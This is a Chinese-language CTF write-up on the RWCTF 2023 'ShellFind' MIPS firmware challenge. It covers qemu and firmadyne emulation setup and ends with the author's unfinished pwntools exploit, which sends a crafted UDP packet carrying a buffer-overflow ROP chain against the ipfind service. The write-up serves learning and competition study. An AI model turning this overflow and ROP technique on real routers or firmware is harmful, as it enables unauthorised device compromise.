---
title: 'RWCTF 2023 ShellFind'
date: 2023-02-08 10:21:00
category: CTF
tags: [mips, firmware]
published: true
hideInList: false
feature: 
isTop: false
---

## 环境搭建

这题主要当时搭建环境用了很多时间，导致最后没时间写`exp`，在此记录一下环境搭建的过程

主要环境搭建还是有三种办法：`qemu-system`起`mips system`环境；`qemu-user`起单个二进制文件；`firmadyne`起`mips system`环境

### qemu-system

从[aurel32 mips](https://people.debian.org/~aurel32/qemu/mips/)中下载对应的`qemu`镜像

在起系统之前需要建立`qemu`系统和宿主机之间的网络桥接

依次运行以下指令

1. `sudo apt-get install bridge-utils uml-utilities`
2. `sudo gedit /etc/network/interfaces`

```
auto lo
iface lo inet loopback

auto ens33
iface ens33 inet dhcp

#auto br0
iface br0 inet dhcp
  bridge_ports ens33
  bridge_maxwait 0
```

3. `sudo gedit /etc/qemu-ifup` （最后添加几行）

```
#! /bin/sh
# Script to bring a network (tap) device for qemu up.
# The idea is to add the tap device to the same bridge
# as we have default routing to.

# in order to be able to find brctl
PATH=$PATH:/sbin:/usr/sbin
ip=$(which ip)

if [ -n "$ip" ]; then
   ip link set "$1" up
else
   brctl=$(which brctl)
   if [ ! "$ip" -o ! "$brctl" ]; then
     echo "W: $0: not doing any bridge processing: neither ip nor brctl utility not found" >&2
     exit 0
   fi
   ifconfig "$1" 0.0.0.0 up
fi

switch=$(ip route ls | \
    awk '/^default / {
          for(i=0;i<NF;i++) { if ($i == "dev") { print $(i+1); next; } }
         }'
        )

# only add the interface to default-route bridge if we
# have such interface (with default route) and if that
# interface is actually a bridge.
# It is possible to have several default routes too
for br in $switch; do
    if [ -d /sys/class/net/$br/bridge/. ]; then
        if [ -n "$ip" ]; then
          ip link set "$1" master "$br"
        else
          brctl addif $br "$1"
        fi
        exit	# exit with status of the previous command
    fi
done

echo "W: $0: no bridge for guest interface found" >&2

################################################################
#!/bin/sh
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
sudo /sbin/brctl addif br0 $1
sleep 3
```

4. `sudo chmod a+x /etc/qemu-ifup`
5. `sudo service network-manager restart` 重启服务
6. `sudo ifconfig ens33 down` 关闭`ens33`
7. `sudo ifup br0` 起`br0`桥接，看到类似如下内容即成功了
```
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/br0/00:0c:29:ae:1b:28
Sending on   LPF/br0/00:0c:29:ae:1b:28
Sending on   Socket/fallback
Created duid "\000\001\000\001+J\377\"\000\014)\256\033(".
DHCPDISCOVER on br0 to 255.255.255.255 port 67 interval 3 (xid=0xcab4930e)
DHCPOFFER of 192.168.152.132 from 192.168.152.254
DHCPREQUEST for 192.168.152.132 on br0 to 255.255.255.255 port 67 (xid=0xe93b4ca)
DHCPACK of 192.168.152.132 from 192.168.152.254 (xid=0xcab4930e)
bound to 192.168.152.132 -- renewal in 853 seconds.
```

通过`ifconfig`看`ip`

或者通过如下链接的方法创建网桥
> http://wiki.yanick.site/wiki/os/qemu/

通过如下命令，起`qemu system`

```shell
sudo qemu-system-mips -M malta \
    -kernel vmlinux-2.6.32-5-4kc-malta \
    -hda debian_squeeze_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -net nic \
    -net tap \
    -nographic
```

通过如下指令进行，切换系统

```
scp -r ./squashfs-root/ root@192.168.152.133:/root/
chroot /root/squashfs-root sh
```

### qemu-user

当找到核心关键的二进制文件之后，通过如下指令进行调试

```
sudo qemu-mips -g 12345 -L . ./usr/sbin/ipfind eth0
```

`gdbscript`如下

```
# set architecture mips
# set endian big
file /mnt/d/Desktop/ctf/rwctf2023/firmware/_firmware.bin.extracted/squashfs-root/usr/sbin/ipfind
set sysroot /mnt/d/Desktop/ctf/rwctf2023/firmware/_firmware.bin.extracted/squashfs-root
target remote:12345
tb *0x401088
tb *0x401078
```

### firmadyne

可以直接通过`AttifyOS`中的`firmadyne`直接运行

最好的是，该系统可以直接运行固件系统自启时的一些服务，从而直接看到什么服务是自启的，而不用自己去找

当然也可以自己查看`/etc/rc.d/rcS.d/`

## exp

写`exp`的时候，实话说，很久没写过`mips rop`就基本不怎么会写了，一开始完全没注意到是`NX disabled`的，然后对于库函数的使用，最开始的时候没恢复`$gp`，后面再写的时候基本就时间不够了

一个未写完的`exp`

```
import socket
import sys
from pwn import *
import base64


TARGET_IP = "172.25.67.200"
TARGET_PORT = 62720
bufferSize          = 1024

serverAddressPort   = (TARGET_IP, TARGET_PORT)

context.log_level = "debug"

io = remote(TARGET_IP, TARGET_PORT, typ="udp")

def leakMacAddress():
    # leak
    msgFromClient = b'FIVI'
    msgFromClient += b'1234'
    # mac
    # 52 54 00 12 34 56
    #msgFromClient += b'\x52\x54\x00\x12\x34\x56'
    msgFromClient += p8(10)
    msgFromClient += p8(1) # magic to bypass 1 check at 0x402684
    msgFromClient += p8(0) # bypass at 0x40268C
    msgFromClient += p8(4)
    msgFromClient += b'a'*0x4
    msgFromClient += b'8'
    msgFromClient += b'\xff'*6 # maybe fake mac address
    msgFromClient += p16(0) # v8
    msgFromClient += p32(0) # v17
    msgFromClient += b'x'*0x20
    io.sendline(msgFromClient)

def pwn():
    # 0x00400e40: addiu $sp, $sp, 0x20; lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20;
    # .text:004020B0  move $a0, $s0;
    # .text:00400F3C
    # 0x00400d70: lw $t9, ($s0); addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
    # .text:00401220
    # 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
    # 00402ac0 : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20

    # 0x41b030
    gp = b"\x00\x41\xb0\x30"


    # lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
    gadget1 = b"\x00\x40\x2A\xC0"
    # call sendto
    gadget2 = b"\x00\x40\x1D\x7C"
    # addiu $sp, $sp, 0x20; lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20;
    gadget3 = b"\x00\x40\x0e\x40"



    payload = b"A"*0x240+b"B"*0x4+b"C"*0x4+b"D"*0x4
    # 0x402ac0: set gp
    payload += gadget1
    payload += b"X"*0x10
    # $gp: 0x41b030
    payload += gp
    payload += b"X"*0x8
    payload += gadget3
    payload += b"X"*0x20
    payload += b"X"*0x1c
    payload += gadget3
    payload += b"X"*0x4
    payload += b"X"*0x20
    payload += b"X"*0x1c
    payload += gadget2

    msgFromClient = b'FIVI'
    msgFromClient += b'1234'
    # mac
    # 52 54 00 12 34 56
    #msgFromClient += b'\x52\x54\x00\x12\x34\x56'
    msgFromClient += p8(10)
    msgFromClient += p8(2) # magic to bypass 1 check at 0x402684
    msgFromClient += p8(0) # bypass at 0x40268C
    msgFromClient += p8(4)
    msgFromClient += b'a'*0x4
    msgFromClient += b'8'
    # msgFromClient += b'\x52\x54\x00\x12\x34\x56' # maybe fake mac address
    msgFromClient += b'\x00\x15\x5d\xb3\x71\x6a' # maybe fake mac address
    msgFromClient += p16(0) # v8
    msgFromClient += p32(0x8E) # v17
    msgFromClient += b'x'*0x40  # username
    msgFromClient += base64.b64encode(payload)
    io.sendline(msgFromClient)

pwn()
io.interactive()
```

官方[exp](https://mp.weixin.qq.com/s/Wb7SMy8AHtiv71kroHEHsQ)

## 其他

之前翻到另外一个镜像的仓库，但是这个仓库里的镜像不能起起来，可能是我用法没用对

> https://people.debian.org/~jcowgill/qemu-mips/

## 参考

> https://www.freebuf.com/vuls/228726.html
> https://people.debian.org/~aurel32/qemu/mips/
> https://gist.github.com/extremecoders-re/3ddddce9416fc8b293198cd13891b68c
